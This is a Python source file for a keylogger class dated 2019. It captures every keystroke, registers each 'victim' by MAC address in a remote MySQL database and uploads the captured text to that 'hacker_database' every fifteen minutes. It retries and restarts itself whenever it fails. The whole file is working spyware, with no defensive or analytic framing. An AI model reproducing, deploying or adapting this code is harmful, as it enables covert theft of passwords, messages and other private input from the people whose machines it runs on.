#!/usr/bin/env python

import pynput.keyboard
import threading
from mysql.connector import connect
from time import sleep
from uuid import getnode as getmac


class KeyLogger:
    """
        AUTHOR: Yasiru Snerath Karunanayaka
        DATE: 06th JUN 2019
        DOCSTRING: This class will define key logger object
        IMPORTANT: pynput threading, smtplib modules are already imported
        MODULES: pynput.keyboard, threading, smtplib
    """

    def __init__(self, p_id, user_name, password, database, server, port, Sleep=900):
        self.Sleep = int(Sleep)
        self.user_name = user_name
        self.password = str(password)
        self.database = database
        self.server = server
        self.port = port
        self.p_id = p_id
        self.cursor = ''
        self.key_log = ''

    @staticmethod
    def __get_mac_address():
        """
        DOCSTRING: this function will return the mac address asa a string
        """
        mac_number = hex(getmac())[2:]

        mac_address = ''
        for index in range(int(len(mac_number) / 2)):
            mac_address += mac_number[index * 2: index * 2 + 2] + ':'

        mac_address = mac_address[:-1]

        return mac_address

    def __process_key_press(self, key):
        try:
            self.key_log = self.key_log + str(key.char)
        except AttributeError:
            if str(key) == 'Key.space':
                self.key_log = self.key_log + ' '
            else:
                self.key_log = self.key_log + ' <' + str(key) + '> '

    def __report(self):

        hacker_database = connect(
            host=self.server,
            user=self.user_name,
            passwd=self.password,
            database=self.database,
            port=self.port
        )
        my_cursor = hacker_database.cursor()
        command = "SELECT `keys` FROM `key_logs` WHERE `p_id` = {}".format(self.p_id)
        my_cursor.execute(command)
        keys = my_cursor.fetchall()[0][0]

        message = str(keys) + str(self.key_log)

        command = "UPDATE `key_logs` SET `keys` = '{}' WHERE `p_id` = {}".format(str(message), self.p_id)
        my_cursor.execute(command)
        hacker_database.commit()

        self.key_log = ""
        timer = threading.Timer(self.Sleep, self.__report)
        timer.start()

    def __check_if_new_victim(self):
        hacker_database = connect(
            host=self.server,
            user=self.user_name,
            passwd=self.password,
            database=self.database,
            port=self.port
        )
        my_cursor = hacker_database.cursor()
        command = "SELECT `keys` FROM `key_logs` WHERE `p_id` = {}".format(self.p_id)
        my_cursor.execute(command)
        keys = my_cursor.fetchall()

        if len(keys) == 0:
            command = "INSERT INTO `key_logs`(`p_id`,`mac_address` ,`keys`) VALUES({}, '{}', '')".format(self.p_id, self.__get_mac_address())
            my_cursor.execute(command)
            hacker_database.commit()
        else:
            hacker_database.commit()

    def start(self):
        try:
            # check if this is a new victim
            # first connect to the database
            self.__check_if_new_victim()
            keyboard_listener = pynput.keyboard.Listener(on_press=self.__process_key_press)
            with keyboard_listener:
                self.__report()
                keyboard_listener.join()
 
        except Exception:
            sleep(self.Sleep)
            self.start()
